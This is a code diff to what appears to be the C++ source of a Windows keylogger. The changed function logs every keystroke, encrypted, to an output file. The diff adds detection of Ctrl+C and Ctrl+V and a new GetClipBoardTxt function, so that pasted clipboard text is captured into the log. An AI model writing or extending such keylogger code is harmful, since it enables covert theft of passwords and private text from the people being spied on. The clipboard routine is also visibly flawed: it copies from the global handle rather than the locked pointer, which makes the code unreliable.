@@ -45,6 +45,9 @@ void Log::LogItInt(int key_stroke) {
     std::cout << key_stroke << std::endl;
 
     switch (key_stroke) {                                                       //fix OEMX keys by checking for shift and keyb layout
+    case VK_OEM_COPY:
+        fprintf(OUTPUT_FILE, "%s", EncryptMyString("[COPY]"));
+        break;
     case VK_BACK:
         fprintf(OUTPUT_FILE, "%s", EncryptMyString("[BACKSPACE]"));
         break;
@@ -69,7 +72,18 @@ void Log::LogItInt(int key_stroke) {
     case VK_RSHIFT:
         fprintf(OUTPUT_FILE, "%s", EncryptMyString("[SHIFT]"));
         break;
-    case  VK_CONTROL:
+    case VK_RCONTROL:
+    case VK_LCONTROL:
+    case VK_CONTROL:
+        if ((GetKeyState(0x56) & 0x8000) != 0) {
+            fprintf(OUTPUT_FILE, "%s", EncryptMyString("[PASTE]"));
+            fprintf(OUTPUT_FILE, "%s", EncryptMyString(GetClipBoardTxt()));
+            break;
+        }
+        if ((GetKeyState((int)'C') & 0x8000) != 0) {
+            fprintf(OUTPUT_FILE, "%s", EncryptMyString("[COPY]"));
+            break;
+        }
         fprintf(OUTPUT_FILE, "%s", EncryptMyString("[CONTROL]"));               //later check for clipboard
         break;
     case  27:
@@ -98,9 +112,9 @@ void Log::LogItInt(int key_stroke) {
     case 40:
         fprintf(OUTPUT_FILE, "%s", EncryptMyString("[DOWN]"));
         break;
-    case VK_OEM_2:
+    /*case VK_OEM_2:
         fprintf(OUTPUT_FILE, "%s", EncryptMyString("[OEM2( /? )]"));
-        break;
+        break;*/
     case VK_OEM_3:
         fprintf(OUTPUT_FILE, "%s", EncryptMyString("[OEM3( ]} )]"));
         break;
@@ -381,6 +395,28 @@ HRESULT CopyItems(__in InputIterator first, __in InputIterator last, __in PCSTR 
         }
     }
     return hr;
+}
+
+std::string GetClipBoardTxt() {
+    LPSTR lpstr;
+    HGLOBAL hglb;
+    char ClipBuffer[1000];
+    if (!IsClipboardFormatAvailable(CF_TEXT))
+        return "\nError retrieving clipboard format (the copied data wasn't text).\n";
+    if (!OpenClipboard(NULL))
+        return "\nError opening clipboard.\n";
+    hglb = GetClipboardData(CF_TEXT);
+    if (hglb != NULL)
+    {
+        lpstr = (LPSTR)GlobalLock(hglb);
+        if (lpstr != NULL)
+        {
+            strcpy_s(ClipBuffer,sizeof(ClipBuffer),(char*)hglb);
+            GlobalUnlock(hglb);
+        }
+    }
+    CloseClipboard();
+    return ClipBuffer;
 }
 
 #pragma warning( pop )
